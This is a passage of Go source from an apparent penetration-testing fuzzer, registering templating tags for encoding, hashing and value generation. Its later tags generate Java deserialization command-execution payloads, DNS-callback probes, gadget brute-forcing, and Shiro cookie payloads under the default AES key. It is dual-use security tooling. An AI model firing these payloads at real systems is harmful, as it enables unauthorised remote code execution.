			}

			return nil
		},
		Alias:               []string{"re:n", "regex:n", "regexp:n"},
		Description:         "使用正则生成所有可能的字符中的随机n个",
		TagNameVerbose:      "正则生成n条数据",
		ArgumentDescription: "{{string_split([a-z0-9]:正则表达式)}}{{optional(number(1:数量))}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "rangechar",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			var min byte = 0
			var max byte = 0xff

			ret := utils.PrettifyListFromStringSplited(s, ",")
			switch len(ret) {
			case 2:
				p1, p2 := ret[0], ret[1]
				p1Uint, _ := strconv.ParseUint(p1, 16, 8)
				min = uint8(p1Uint)
				p2Uint, _ := strconv.ParseUint(p2, 16, 8)
				max = uint8(p2Uint)
				if max <= 0 {
					max = 0xff
				}
			case 1:
				p2Uint, _ := strconv.ParseUint(ret[0], 16, 8)
				max = uint8(p2Uint)
				if max <= 0 {
					max = 0xff
				}
			}

			if min > max {
				min = 0
			}

			for i := min; true; i++ {
				// res = append(res, string(i))
				if err := tryYield(ctx, yield, string(i)); err != nil {
					return err
				}
				if i >= max {
					break
				}
			}
			return nil
		},
		Alias:               []string{"range:char", "range"},
		Description:         "按顺序生成一个 range 字符集，例如 `{{rangechar(20,7e)}}` 生成 0x20 - 0x7e 的字符集，默认最大值是 0xff",
		TagNameVerbose:      "生成字符集",
		ArgumentDescription: "{{number(20:开始字符)}}{{optional(number(7e:结束字符,默认值ff))}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "network",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			utils.ParseStringToHostsWithCallback(s, func(host string) bool {
				return tryYield(ctx, yield, host) != nil
			})
			return nil
		},
		Alias:               []string{"host", "hosts", "cidr", "ip", "net"},
		Description:         "生成一个网络地址，例如 `{{network(192.168.1.1/24)}}` 对应 cidr 192.168.1.1/24 所有地址，可以通过逗号传入多个，例如 `{{network(8.8.8.8,192.168.1.1/25,example.com)}}`",
		TagNameVerbose:      "生成网络地址",
		ArgumentDescription: "{{list(string(192.168.1.1/24:网络地址,可使用ip段和CIDR无类别域间路由))}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "int",
		HandlerAndYield: func(ctx context.Context, s string, yield func(result *parser.FuzzResult)) error {
			yieldString := func(s string) {
				yield(parser.NewFuzzResultWithDataVerbose(s, s))
			}
			if s == "" {
				yieldString(fmt.Sprint(rand.Intn(10)))
				return nil
			}

			enablePadding := false
			paddingLength := 4
			paddingRight := false
			step := 1

			// 使用管道符号分割参数
			parts := strings.Split(s, "|")

			if len(parts) > 1 {
				s = parts[0]
				paddingSuffix := strings.TrimSpace(parts[1])
				enablePadding = true
				paddingRight = strings.HasPrefix(paddingSuffix, "-")
				rawLen := strings.TrimLeft(paddingSuffix, "-")
				paddingLength, _ = strconv.Atoi(rawLen)
			}

			if strings.Contains(s, "-") {
				splited := strings.Split(s, "-")
				left := splited[0]
				if len(left) > 1 && strings.HasPrefix(left, "0") {
					enablePadding = true
					paddingLength = len(left)
				}
			}

			if len(parts) > 2 {
				step, _ = strconv.Atoi(parts[2])
			}
			minInt, maxInt, ok := strings.Cut(parts[0], "-")
			if !ok {
				lo.Map(strings.Split(parts[0], ","), func(s string, _ int) string {
					yieldString(strings.TrimSpace(s))
					return strings.TrimSpace(s)
				})
				return nil
			}

			var minB, maxB, capB, stepB *big.BigInt

			minB = big.NewDecFromString(minInt)
			maxB = big.NewDecFromString(maxInt)
			stepB = big.NewInt(int64(step))
			if minB.Cmp(maxB) > 0 {
				return nil
			}
			capB = maxB.Sub(minB).AddInt(1).Div(stepB)

			if !capB.IsUint64() {
				// too large
				return utils.Error("int fuzztag: too large int range")
			}

			// results := make([]string, 0, capB.Int64())
			for {
				select {
				case <-ctx.Done():
					return nil
				default:
				}
				if minB.Cmp(maxB) > 0 {
					break
				}

				r := minB.String()
				// padding
				if enablePadding {
					r = paddingString(r, paddingLength, paddingRight)
				}

				yieldString(r)
				minB = minB.Add(stepB)
			}
			return nil
		},
		Alias:               []string{"port", "ports", "integer", "i"},
		Description:         "生成一个整数以及范围，例如 {{int(1,2,3,4,5)}} 生成 1,2,3,4,5 中的一个整数，也可以使用 {{int(1-5)}} 生成 1-5 的整数，也可以使用 `{{int(1-5|4)}}` 生成 1-5 的整数，但是每个整数都是 4 位数，例如 0001, 0002, 0003, 0004, 0005，还可以使用 `{{int(1-10|2|3)}}` 来生成带有步长的整数列表。",
		TagNameVerbose:      "生成整数列表",
		ArgumentDescription: "{{string_split(1-5:整数范围或逗号分割的整数列表)}}{{optional(number_split(4:填充长度))}}{{optional(number(2:步长))}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "randint",
		IsDynFun: func(name, params string) bool {
			if len(utils.PrettifyListFromStringSplited(params, ",")) == 3 {
				return false
			}
			return true
		},
		HandlerAndYieldString: func(s string, yield func(s string)) error {
			var (
				minB, maxB *big.BigInt
				count      uint = 1
				err        error

				enablePadding = false
				paddingRight  bool
				paddingLength int
			)

			splitted := strings.SplitN(s, "|", 2)
			if len(splitted) > 1 {
				s = splitted[0]
				paddingSuffix := strings.TrimSpace(splitted[1])
				enablePadding = true
				paddingRight = strings.HasPrefix(paddingSuffix, "-")
				rawLen := strings.TrimLeft(paddingSuffix, "-")
				paddingLength, _ = strconv.Atoi(rawLen)
			}

			raw := utils.PrettifyListFromStringSplited(s, ",")
			switch len(raw) {
			case 3:
				count, err = parseUint(raw[2])
				if err != nil {
					yield(fmt.Sprint(rand.Intn(10)))
					return nil
				}
				fallthrough
			case 2:
				minB = big.NewDecFromString(raw[0])
				maxB = big.NewDecFromString(raw[1])
			case 1:
				minB = big.NewInt(0)
				maxB = big.NewDecFromString(raw[0])
			}

			if cmpB := minB.Cmp(maxB); cmpB > 0 {
				return nil
			} else if cmpB == 0 {
				yield(paddingString(minB.String(), paddingLength, paddingRight))
				return nil
			}

			for i := uint(0); i < count; i++ {
				addB, err := cryptoRand.Int(cryptoRand.Reader, maxB.Sub(minB).Int)
				if err != nil {
					yield(fmt.Sprint(rand.Intn(10)))
					return nil
				}
				addB = addB.Add(addB, minB.Int)
				r := addB.String()

				if enablePadding {
					r = paddingString(r, paddingLength, paddingRight)
				}
				yield(r)
			}
			return nil
		},
		Alias:               []string{"ri", "rand:int", "randi"},
		Description:         "随机生成整数，定义为 {{randint(10)}} 生成0-10中任意一个随机数，{{randint(1,50)}} 生成 1-50 任意一个随机数，{{randint(1,50,10)}} 生成 1-50 任意一个随机数，重复 10 次，{{randint(1,50,10|-4)}} 生成 1-50 任意一个随机数，重复 10 次，对于长度不足4的随机数在右侧进行填充",
		TagNameVerbose:      "随机生成整数",
		ArgumentDescription: "{{number_dot(1:随机数最下限<单独存在的时候表达随机数的上限[下限是0]>)}}{{optional(number_dot(50:随机数的上限))}}{{optional(number_split(4:重复次数))}}{{optional(number(4:填充长度，如果是负数，则从右侧填充))}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "randstr",
		IsDynFun: func(name, params string) bool {
			if len(utils.PrettifyListFromStringSplited(params, ",")) == 3 {
				return false
			}
			return true
		},
		HandlerAndYieldString: func(s string, yield func(s string)) error {
			var (
				min, max, count uint
				err             error
			)
			fuzztagfallback := func() {
				yield(utils.RandStringBytes(8))
			}
			count = 1
			min = 1
			raw := utils.PrettifyListFromStringSplited(s, ",")
			switch len(raw) {
			case 3:
				count, err = parseUint(raw[2])
				if err != nil {
					fuzztagfallback()
					return err
				}

				if count <= 0 {
					count = 1
				}
				fallthrough
			case 2:
				min, err = parseUint(raw[0])
				if err != nil {
					fuzztagfallback()
					return err
				}
				max, err = parseUint(raw[1])
				if err != nil {
					fuzztagfallback()
					return err
				}
				min = uint(utils.Min(int(min), int(max)))
				max = uint(utils.Max(int(min), int(max)))
				if max >= 1e8 {
					max = 1e8
					err = fmt.Errorf("max length is 100000000")
				}
				break
			case 1:
				max, err = parseUint(raw[0])
				if err != nil {
					fuzztagfallback()
					return err
				}
				min = max
				if max <= 0 {
					max = 8
				}
				break
			default:
				fuzztagfallback()
				return err
			}

			RepeatFunc(count, func() bool {
				result := int(max - min)
				if result < 0 {
					result = 8
				}

				var offset uint = 0
				if result > 0 {
					offset = uint(rand.Intn(result))
				}
				c := min + offset
				yield(utils.RandStringBytes(int(c)))
				return true
			})
			return err
		},
		Alias:               []string{"rand:str", "rs", "rands"},
		Description:         "随机生成个字符串，定义为 {{randstr(10)}} 生成长度为 10 的随机字符串，{{randstr(1,30)}} 生成长度为 1-30 为随机字符串，{{randstr(1,30,10)}} 生成 10 个随机字符串，长度为 1-30",
		TagNameVerbose:      "随机生成字符串",
		ArgumentDescription: "{{number(10:最小长度<单独存在的时候指定随机字符的长度>)}}{{optional(number(20:最大长度))}}{{optional(number(2:数量))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "unquote",
		Handler: func(s string) []string {
			raw, err := strconv.Unquote(s)
			if err != nil {
				raw, err := strconv.Unquote(`"` + s + `"`)
				if err != nil {
					log.Errorf("unquoted failed: %s", err)
					return []string{s}
				}
				return []string{raw}
			}

			return []string{
				raw,
			}
		},
		Description:         "把内容进行 strconv.Unquote 转化",
		TagNameVerbose:      "去除引号",
		ArgumentDescription: "{{string(\"abc\":字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "quote",
		Handler: func(s string) []string {
			return []string{
				strconv.Quote(s),
			}
		},
		Description:         "strconv.Quote 转化",
		TagNameVerbose:      "引号包裹",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "lower",
		Handler: func(s string) []string {
			return []string{
				strings.ToLower(s),
			}
		},
		Description:         "把传入的内容都设置成小写 {{lower(Abc)}} => abc",
		TagNameVerbose:      "字符串转小写",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "upper",
		Handler: func(s string) []string {
			return []string{
				strings.ToUpper(s),
			}
		},
		Description:         "把传入的内容变成大写 {{upper(abc)}} => ABC",
		TagNameVerbose:      "字符串转大写",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "base64enc",
		Handler: func(s string) []string {
			return []string{
				base64.StdEncoding.EncodeToString([]byte(s)),
			}
		},
		Alias:               []string{"base64encode", "base64e", "base64", "b64"},
		Description:         "进行 base64 编码，{{base64enc(abc)}} => YWJj",
		TagNameVerbose:      "base64编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "base64dec",
		Handler: func(s string) []string {
			r, err := codec.DecodeBase64(s)
			if err != nil {
				return []string{s}
			}
			return []string{string(r)}
		},
		Alias:               []string{"base64decode", "base64d", "b64d"},
		Description:         "进行 base64 解码，{{base64dec(YWJj)}} => abc",
		TagNameVerbose:      "base64解码",
		ArgumentDescription: "{{string(YWJj:base64字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "md5",
		Handler: func(s string) []string {
			return []string{codec.Md5(s)}
		},
		Description:         "进行 md5 编码，{{md5(abc)}} => 900150983cd24fb0d6963f7d28e17f72",
		TagNameVerbose:      "md5编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "hexenc",
		Handler: func(s string) []string {
			return []string{codec.EncodeToHex(s)}
		},
		Alias:               []string{"hex", "hexencode"},
		Description:         "HEX 编码，{{hexenc(abc)}} => 616263",
		TagNameVerbose:      "HEX编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "hexdec",
		Handler: func(s string) []string {
			raw, err := codec.DecodeHex(s)
			if err != nil {
				return []string{s}
			}
			return []string{string(raw)}
		},
		Alias:               []string{"hexd", "hexdecode"},
		Description:         "HEX 解码，{{hexdec(616263)}} => abc",
		TagNameVerbose:      "HEX解码",
		ArgumentDescription: "{{string(616263:HEX字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:             "sha1",
		Handler:             func(s string) []string { return []string{codec.Sha1(s)} },
		Description:         "进行 sha1 编码，{{sha1(abc)}} => a9993e364706816aba3e25717850c26c9cd0d89d",
		TagNameVerbose:      "sha1编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:             "sha256",
		Handler:             func(s string) []string { return []string{codec.Sha256(s)} },
		Description:         "进行 sha256 编码，{{sha256(abc)}} => ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
		TagNameVerbose:      "sha256编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:             "sha224",
		Handler:             func(s string) []string { return []string{codec.Sha224(s)} },
		Description:         "进行 sha224 编码",
		TagNameVerbose:      "sha224编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:             "sha512",
		Handler:             func(s string) []string { return []string{codec.Sha512(s)} },
		Description:         "进行 sha512 编码，{{sha512(abc)}} => ddaf35a193617abacc417349ae20413112e6fa4e89a97ea20a9eeee64b55d39a2192992a274fc1a836ba3c23a3feebbd454d4423643ce80e2a9ac94fa54ca49f",
		TagNameVerbose:      "sha512编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:             "sha384",
		Handler:             func(s string) []string { return []string{codec.Sha384(s)} },
		TagNameVerbose:      "sha384编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:             "sm3",
		Handler:             func(s string) []string { return []string{codec.EncodeToHex(codec.SM3(s))} },
		Description:         "计算 sm3 哈希值，{{sm3(abc)}} => 66c7f0f462eeedd9d1f2d46bdc10e4e24167c4875cf2f7a3f0b8ddb27d8a7eb3",
		TagNameVerbose:      "sm3哈希",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "hextobase64",
		Handler: func(s string) []string {
			raw, err := codec.DecodeHex(s)
			if err != nil {
				return []string{s}
			}
			return []string{base64.StdEncoding.EncodeToString(raw)}
		},
		Alias:               []string{"h2b64", "hex2base64"},
		Description:         "把 HEX 字符串转换为 base64 编码，{{hextobase64(616263)}} => YWJj",
		TagNameVerbose:      "HEX转base64",
		ArgumentDescription: "{{string(616263:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "base64tohex",
		Handler: func(s string) []string {
			raw, err := codec.DecodeBase64(s)
			if err != nil {
				return []string{s}
			}
			return []string{codec.EncodeToHex(string(raw))}
		},
		Alias:               []string{"b642h", "base642hex"},
		Description:         "把 Base64 字符串转换为 HEX 编码，{{base64tohex(YWJj)}} => 616263",
		TagNameVerbose:      "base64转HEX",
		ArgumentDescription: "{{string(YWJj:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "urlescape",
		Handler: func(s string) []string {
			return []string{codec.QueryEscape(s)}
		},
		Alias:               []string{"urlesc"},
		Description:         "url 编码(只编码特殊字符)，{{urlescape(abc=)}} => abc%3d",
		TagNameVerbose:      "URL编码",
		ArgumentDescription: "{{string(abc=:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "urlenc",
		Handler: func(s string) []string {
			return []string{codec.EncodeUrlCode(s)}
		},
		Alias:               []string{"urlencode", "url"},
		Description:         "URL 强制编码，{{urlenc(abc)}} => %61%62%63",
		TagNameVerbose:      "URL强制编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "urldec",
		Handler: func(s string) []string {
			r, err := codec.QueryUnescape(s)
			if err != nil {
				return []string{s}
			}
			return []string{string(r)}
		},
		Alias:               []string{"urldecode", "urld"},
		Description:         "URL 强制解码，{{urldec(%61%62%63)}} => abc",
		TagNameVerbose:      "URL强制解码",
		ArgumentDescription: "{{string(%61%62%63:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "doubleurlenc",
		Handler: func(s string) []string {
			return []string{codec.DoubleEncodeUrl(s)}
		},
		Alias:               []string{"doubleurlencode", "durlenc", "durl"},
		Description:         "双重URL编码，{{doubleurlenc(abc)}} => %2561%2562%2563",
		TagNameVerbose:      "双重URL编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "doubleurldec",
		Handler: func(s string) []string {
			r, err := codec.DoubleDecodeUrl(s)
			if err != nil {
				return []string{s}
			}
			return []string{r}
		},
		Alias:               []string{"doubleurldecode", "durldec", "durldecode"},
		Description:         "双重URL解码，{{doubleurldec(%2561%2562%2563)}} => abc",
		TagNameVerbose:      "双重URL解码",
		ArgumentDescription: "{{string(%2561%2562%2563:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "htmlenc",
		Handler: func(s string) []string {
			return []string{codec.EncodeHtmlEntity(s)}
		},
		Alias:               []string{"htmlencode", "html", "htmle", "htmlescape"},
		Description:         "HTML 实体编码，{{htmlenc(abc)}} => &#97;&#98;&#99;",
		TagNameVerbose:      "HTML实体编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "htmlhexenc",
		Handler: func(s string) []string {
			return []string{codec.EncodeHtmlEntityHex(s)}
		},
		Alias:               []string{"htmlhex", "htmlhexencode", "htmlhexescape"},
		Description:         "HTML 十六进制实体编码，{{htmlhexenc(abc)}} => &#x61;&#x62;&#x63;",
		TagNameVerbose:      "HTML十六进制实体编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "htmldec",
		Handler: func(s string) []string {
			return []string{codec.UnescapeHtmlString(s)}
		},
		Alias:               []string{"htmldecode", "htmlunescape"},
		Description:         "HTML 解码，{{htmldec(&#97;&#98;&#99;)}} => abc",
		TagNameVerbose:      "HTML解码",
		ArgumentDescription: "{{string(&#97;&#98;&#99;:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "repeatstr",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			if !strings.Contains(s, "|") {
				return tryYield(ctx, yield, s)
			}
			s, number := sepToEnd(s, "|")
			n, err := strconv.Atoi(number)
			if err != nil {
				return tryYield(ctx, yield, s)
			}
			if err := tryYield(ctx, yield, strings.Repeat(s, n)); err != nil {
				return err
			}
			return nil
		},
		Alias:               []string{"repeat:str"},
		Description:         "重复字符串，`{{repeatstr(abc|3)}}` => abcabcabc",
		TagNameVerbose:      "重复字符串",
		ArgumentDescription: "{{string_split(abc:字符串)}}{{number(3:重复次数)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "randomupper",
		Handler: func(s string) []string {
			return []string{codec.RandomUpperAndLower(s)}
		},
		Alias:               []string{"random:upper", "random:lower"},
		Description:         "随机大小写，{{randomupper(abc)}} => aBc",
		TagNameVerbose:      "随机大小写",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "jsonpath",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			args := utils.PrettifyListFromStringSplited(s, "|")
			if len(args) == 2 {
				return tryYield(ctx, yield, utils.InterfaceToString(jsonpath.FindFirst(args[0], args[1])))
			} else if len(args) >= 3 {
				return tryYield(ctx, yield, utils.InterfaceToString(jsonpath.ReplaceAll(args[0], args[1], args[2])))
			}
			return tryYield(ctx, yield, s)
		},
		Description:         "将内容JSON解码并通过JsonPath寻找或替换对应的值",
		TagNameVerbose:      "JsonPath",
		ArgumentDescription: "{{string_split(value:json字符串)}}{{string_split($.key:JsonPath)}}{{optional(string(replaced:替换的字符串))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "yso:exec",
		HandlerEx: func(s string) []*fuzztag.FuzzExecResult {
			var result []*fuzztag.FuzzExecResult
			pushNewResult := func(d []byte, verbose []string) {
				result = append(result, fuzztag.NewFuzzExecResult(d, verbose))
			}
			for _, gadget := range yso.GetAllRuntimeExecGadget() {
				javaObj, err := gadget(s)
				if javaObj == nil || err != nil {
					continue
				}
				objBytes, err := yso.ToBytes(javaObj)
				if err != nil {
					continue
				}
				pushNewResult(objBytes, []string{javaObj.Verbose().GetNameVerbose(), "runtime exec evil class", s})
			}
			for _, gadget := range yso.GetAllTemplatesGadget() {
				javaObj, err := gadget(yso.SetProcessImplExecEvilClass(s))
				if javaObj == nil || err != nil {
					continue
				}
				objBytes, err := yso.ToBytes(javaObj)
				if err != nil {
					continue
				}
				pushNewResult(objBytes, []string{javaObj.Verbose().GetNameVerbose(), "processImpl exec evil class", s})
			}
			if len(result) > 0 {
				return result
			}

			return []*fuzztag.FuzzExecResult{fuzztag.NewFuzzExecResult([]byte(s), []string{s})}
		},
		TagNameVerbose:      "生成所有命令执行payload",
		ArgumentDescription: "{{string(whoami:命令)}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "yso:dnslog",
		HandlerEx: func(s string) []*fuzztag.FuzzExecResult {
			var getDomain func(name string) string
			sSplit := strings.Split(s, "|")
			if len(sSplit) == 2 {
				n := 0
				getDomain = func(name string) string {
					n++
					return fmt.Sprintf("%s%d.%s", sSplit[1], n, sSplit[0])
				}
			} else {
				getDomain = func(name string) string {
					return fmt.Sprintf("%s.%s", name, sSplit[0])
				}
			}
			var result []*fuzztag.FuzzExecResult
			pushNewResult := func(d []byte, verbose []string) {
				result = append(result, fuzztag.NewFuzzExecResult(d, verbose))
			}
			for _, gadgetInfo := range yso.YsoConfigInstance.Gadgets {
				domain := getDomain(gadgetInfo.Name)
				if gadgetInfo.IsTemplateImpl {
					javaObj, err := yso.GenerateGadget(gadgetInfo.Name, "DNSLog", domain)
					if javaObj == nil || err != nil {
						continue
					}
					objBytes, err := yso.ToBytes(javaObj)
					if err != nil {
						continue
					}
					pushNewResult(objBytes, []string{javaObj.Verbose().GetNameVerbose(), "dnslog evil class", domain})
				} else {
					if gadgetInfo.Name == string(yso.GadgetFindAllClassesByDNS) {
						continue
					}
					javaObj, err := yso.GenerateGadget(gadgetInfo.Name, "dnslog", domain)
					if javaObj == nil || err != nil {
						continue
					}
					objBytes, err := yso.ToBytes(javaObj)
					if err != nil {
						continue
					}
					pushNewResult(objBytes, []string{javaObj.Verbose().GetNameVerbose(), "dnslog by transform chain", domain})
				}
			}
			if len(result) > 0 {
				return result
			}

			return []*fuzztag.FuzzExecResult{fuzztag.NewFuzzExecResult([]byte(s), []string{s})}
		},
		TagNameVerbose:      "生成所有 DNSLog payload",
		ArgumentDescription: "{{string_split(xxx.dnslog.cn:Dnslog域名)}}{{string(flag:前缀)}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "yso:urldns",
		HandlerEx: func(s string) []*fuzztag.FuzzExecResult {
			var result []*fuzztag.FuzzExecResult
			javaObj, err := yso.GetURLDNSJavaObject(s)
			if err == nil {
				objBytes, err := yso.ToBytes(javaObj)
				if err == nil {
					return append(result, fuzztag.NewFuzzExecResult(objBytes, []string{javaObj.Verbose().GetNameVerbose()}))
				}
			}
			return []*fuzztag.FuzzExecResult{fuzztag.NewFuzzExecResult([]byte(s), []string{s})}
		},
		TagNameVerbose:      "生成 URLDNS payload",
		ArgumentDescription: "{{string(xxx.dnslog.cn:Dnslog域名)}}",
	})
	// 标签太长了，前端加了个简单的 fuzztag 提示
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "yso:find_gadget_by_dns",
		HandlerEx: func(s string) []*fuzztag.FuzzExecResult {
			var result []*fuzztag.FuzzExecResult
			javaObj, err := yso.GetFindGadgetByDNSJavaObject(s)
			if err == nil {
				objBytes, err := yso.ToBytes(javaObj)
				if err == nil {
					return append(result, fuzztag.NewFuzzExecResult(objBytes, []string{javaObj.Verbose().GetNameVerbose()}))
				}
			}
			return []*fuzztag.FuzzExecResult{fuzztag.NewFuzzExecResult([]byte(s), []string{s})}
		},
		Description:         "生成一条通过dnslog爆破gadget的payload，如果成功可以在dnslog中看见可用依赖",
		TagNameVerbose:      "通过dnslog爆破gadget",
		ArgumentDescription: "{{string(xxx.dnslog.cn:Dnslog域名)}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "yso:find_gadget_by_bomb",
		HandlerEx: func(s string) []*fuzztag.FuzzExecResult {
			var result []*fuzztag.FuzzExecResult
			pushNewResult := func(d []byte, verbose []string) {
				result = append(result, fuzztag.NewFuzzExecResult(d, verbose))
			}
			if s == "all" {
				for gadget, className := range yso.GetGadgetChecklist() {
					javaObj, err := yso.GetFindClassByBombJavaObject(className)
					if javaObj == nil || err != nil {
						continue
					}
					objBytes, err := yso.ToBytes(javaObj)
					if err != nil {
						continue
					}
					pushNewResult(objBytes, []string{javaObj.Verbose().GetNameVerbose(), "Gadget", gadget})
				}
			} else {
				javaObj, err := yso.GetFindClassByBombJavaObject(s)
				if javaObj == nil || err != nil {
					return result
				}
				objBytes, err := yso.ToBytes(javaObj)
				if err != nil {
					return result
				}
				pushNewResult(objBytes, []string{javaObj.Verbose().GetNameVerbose(), "类名", s})
			}

			if len(result) > 0 {
				return result
			}

			return []*fuzztag.FuzzExecResult{fuzztag.NewFuzzExecResult([]byte(s), []string{s})}
		},
		TagNameVerbose:      "通过延时爆破gadget",
		Description:         "生成一条通过延时爆破gadget的payload，如果成功可以在dnslog中看见可用依赖",
		ArgumentDescription: "{{string(all:类名或者all)}}",
	})
	// 这几个标签不稳定
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "yso:headerecho",
		HandlerEx: func(s string) []*fuzztag.FuzzExecResult {
			headers := strings.Split(s, "|")
			if len(headers) != 2 {
				return []*fuzztag.FuzzExecResult{fuzztag.NewFuzzExecResult([]byte(s), []string{s})}
			}
			var result []*fuzztag.FuzzExecResult
			pushNewResult := func(d []byte, verbose []string) {
				result = append(result, fuzztag.NewFuzzExecResult(d, verbose))
			}
			for _, gadget := range yso.GetAllTemplatesGadget() {
				javaObj, err := gadget(yso.SetMultiEchoEvilClass(), yso.SetHeader(headers[0], headers[1]))
				if javaObj == nil || err != nil {
					continue
				}
				objBytes, err := yso.ToBytes(javaObj)
				if err != nil {
					continue
				}
				pushNewResult(objBytes, []string{javaObj.Verbose().GetNameVerbose(), "tomcat header echo evil class", s})
			}
			if len(result) > 0 {
				return result
			}
			return []*fuzztag.FuzzExecResult{fuzztag.NewFuzzExecResult([]byte(s), []string{s})}
		},
		Description:         "生成多条可以header回显的payload进行爆破，注意：此标签需要设置 headerauth 标签",
		TagNameVerbose:      "爆破header回显链",
		ArgumentDescription: "{{string_split(key:header头的key)}}{{string(value:header头的value)}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:     "yso:bodyexec",
		Description: "生成多条可以body回显的payload进行爆破，注意：此标签需要设置 headerauth 标签",
		HandlerEx: func(s string) []*fuzztag.FuzzExecResult {
			var result []*fuzztag.FuzzExecResult
			pushNewResult := func(d []byte, verbose []string) {
				result = append(result, fuzztag.NewFuzzExecResult(d, verbose))
			}
			for _, gadget := range yso.GetAllTemplatesGadget() {
				javaObj, err := gadget(yso.SetMultiEchoEvilClass(), yso.SetExecAction(), yso.SetParam(s), yso.SetEchoBody())
				if javaObj == nil || err != nil {
					continue
				}
				objBytes, err := yso.ToBytes(javaObj)
				if err != nil {
					continue
				}
				pushNewResult(objBytes, []string{javaObj.Verbose().GetNameVerbose(), "tomcat body exec echo evil class", s})
			}
			if len(result) > 0 {
				return result
			}

			return []*fuzztag.FuzzExecResult{fuzztag.NewFuzzExecResult([]byte(s), []string{s})}
		},
		TagNameVerbose:      "爆破body回显链",
		ArgumentDescription: "{{string(whoami:命令)}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "headerauth",
		Handler: func(s string) []string {
			return []string{"Accept-Language: zh-CN,zh;q=1.9"}
		},
		Description:         "由于回显链需要从多个连接中找到指定连接写入回显信息，所以需要设置一个特定的header",
		TagNameVerbose:      "header认证",
		ArgumentDescription: "",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "shiro:cbc",
		ErrorInfoHandler: func(s string) ([]string, error) {
			var (
				key       = "kPH+bIxk5D2deZiIxcaaaA=="
				shiroByte string
			)

			params := strings.Split(s, ",")
			if len(params) == 2 {
				key = params[0]
				shiroByte = params[1]
			} else {
				shiroByte = s
			}
			bytes, err := codec.DecodeBase64(key)
			if err != nil {
				return nil, err
			}
			decodeBase64, err := codec.DecodeBase64(shiroByte)
			if err != nil {
				return nil, err
			}
			iv := utils.RandStringBytes(16)
			paddingPayload := codec.PKCS5Padding(decodeBase64, 16)
			encrypt, err := codec.AESCBCEncrypt(bytes, paddingPayload, []byte(iv))
			if err != nil {
				return nil, err
			}
			encodeBase64 := codec.EncodeBase64(append([]byte(iv), encrypt...))
			return []string{encodeBase64}, nil
		},
		Description:         "生成shiro-aes类型的payload",
		TagNameVerbose:      "shiro-aes",
		ArgumentDescription: "{{string(key:密钥)}}{{string(payload:利用链)}}",
	})
